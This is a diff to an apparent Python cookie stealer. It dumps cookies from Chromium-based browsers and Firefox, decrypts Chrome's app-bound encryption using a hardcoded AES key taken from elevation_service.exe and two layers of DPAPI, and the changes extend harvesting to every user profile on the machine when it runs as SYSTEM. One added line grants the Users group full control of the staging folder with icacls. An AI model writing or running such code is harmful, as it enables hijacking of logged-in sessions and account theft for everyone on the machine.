@@ -37,14 +37,64 @@ LA    = os.environ["LOCALAPPDATA"];  APP = os.environ["APPDATA"]
 # AES key from elevation_service.exe (Chrome 127..~131); re-extract from binary on new builds
 ELEV_AES = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
 
-CHROMIUM = {
-    "chrome":  rf"{LA}\Google\Chrome\User Data",
-    "edge":    rf"{LA}\Microsoft\Edge\User Data",
-    "brave":   rf"{LA}\BraveSoftware\Brave-Browser\User Data",
-    "vivaldi": rf"{APP}\Vivaldi\User Data",
-    "opera":   rf"{APP}\Opera Software\Opera Stable",
+CHROMIUM_REL = {
+    "chrome":  (r"Google\Chrome\User Data", "local"),
+    "edge":    (r"Microsoft\Edge\User Data", "local"),
+    "brave":   (r"BraveSoftware\Brave-Browser\User Data", "local"),
+    "vivaldi": (r"Vivaldi\User Data", "roaming"),
+    "opera":   (r"Opera Software\Opera Stable", "roaming"),
 }
-FIREFOX = rf"{APP}\Mozilla\Firefox\Profiles"
+FIREFOX_REL = r"Mozilla\Firefox\Profiles"
+
+
+def profile_roots():
+    """[(local_appdata, roaming_appdata)] for this user and every profile on the box.
+
+    A SYSTEM process -- the only context that can unwrap the app-bound key -- gets
+    SYSTEM's own %LOCALAPPDATA% (systemprofile), where no browser has ever run.
+    The files belong to the user profiles, so they have to be enumerated.
+    """
+    roots, seen = [], set()
+
+    def add(la, aa):
+        k = (la.lower(), aa.lower())
+        if la and k not in seen and os.path.isdir(la):
+            seen.add(k)
+            roots.append((la, aa))
+
+    add(os.environ.get("LOCALAPPDATA", ""), os.environ.get("APPDATA", ""))
+    base = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
+    try:
+        for name in sorted(os.listdir(base)):
+            d = os.path.join(base, name)
+            if os.path.isdir(d):
+                add(os.path.join(d, "AppData", "Local"),
+                    os.path.join(d, "AppData", "Roaming"))
+    except OSError:
+        pass
+    return roots
+
+
+def chromium_map():
+    """browser -> User Data root, first existing copy per browser name."""
+    out = {}
+    for la, aa in profile_roots():
+        for name, (rel, where) in CHROMIUM_REL.items():
+            if name in out:
+                continue
+            p = os.path.join(la if where == "local" else aa, rel)
+            if os.path.isdir(p):
+                out[name] = p
+    return out
+
+
+def firefox_roots():
+    out = []
+    for _la, aa in profile_roots():
+        p = os.path.join(aa, FIREFOX_REL)
+        if os.path.isdir(p):
+            out.append(p)
+    return out
 
 # ------------------------------------------------------------------ DPAPI (ctypes, no pywin32)
 class BLOB(ctypes.Structure):
@@ -176,7 +226,7 @@ def dump_chromium(browser, root):
 # ------------------------------------------------------------------ Firefox: no encryption (plaintext cookies)
 def dump_firefox():
     out = []
-    for db in glob.glob(os.path.join(FIREFOX, "*", "cookies.sqlite")):
+    for db in [d for root in firefox_roots() for d in glob.glob(os.path.join(root, "*", "cookies.sqlite"))]:
         prof = os.path.basename(os.path.dirname(db))
         recs, tmp = rows(db, [
             "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite,originAttributes FROM moz_cookies",
@@ -209,7 +259,7 @@ def netscape(cookies):
 
 def harvest(only):
     got = []
-    for name, root in CHROMIUM.items():
+    for name, root in chromium_map().items():
         if only and name not in only: continue
         if os.path.isdir(root):
             part, _ = dump_chromium(name, root); got += part
@@ -263,7 +313,7 @@ def main():
 def abe_blobs():
     """returns [(browser, APPB blob)] for every Chromium with app_bound_encrypted_key"""
     got = []
-    for name, root in CHROMIUM.items():
+    for name, root in chromium_map().items():
         ls = os.path.join(root, "Local State")
         if not os.path.exists(ls): continue
         try:
@@ -279,6 +329,11 @@ def abe_blobs():
 def stage_v20(a):
     os.makedirs(STAGE, exist_ok=True)
     if a.v20_sys:                                                       # layer 1: MACHINE DPAPI
+        # SYSTEM owns the directory it just created; stage 2 runs as the user and
+        # has to write mc-*.key in it. BUILTIN\Users by SID, so the ACL is
+        # locale-proof ("Users" is "Usuarios" here).
+        subprocess.run(["icacls", STAGE, "/grant", "*S-1-5-32-545:(OI)(CI)F"],
+                       capture_output=True)
         for name, blob in abe_blobs():
             try:
                 with open(os.path.join(STAGE, f"{name}.stage1"), "wb") as f: f.write(dpapi(blob, machine=True))
@@ -286,9 +341,13 @@ def stage_v20(a):
         print(f"stage 1 ok -> {STAGE}")
         return
     got = 0
-    for name in CHROMIUM:
-        f = os.path.join(STAGE, f"{name}.stage1")
-        if not os.path.exists(f): continue
+    # stage 2 starts from what stage 1 actually wrote: the file list is the truth,
+    # not the browser map (stage 2 may run under a different context)
+    for fn in sorted(os.listdir(STAGE)):
+        if not fn.endswith(".stage1"):
+            continue
+        name = fn[:-len(".stage1")]
+        f = os.path.join(STAGE, fn)
         with open(f, "rb") as fh: wrapped = dpapi(fh.read())           # layer 2: USER DPAPI
         flag = wrapped[0]                                              # 1 = AES-GCM, other = ChaCha20
         key = open_blob_flag(flag, ELEV_AES, wrapped[1:13], wrapped[13:])
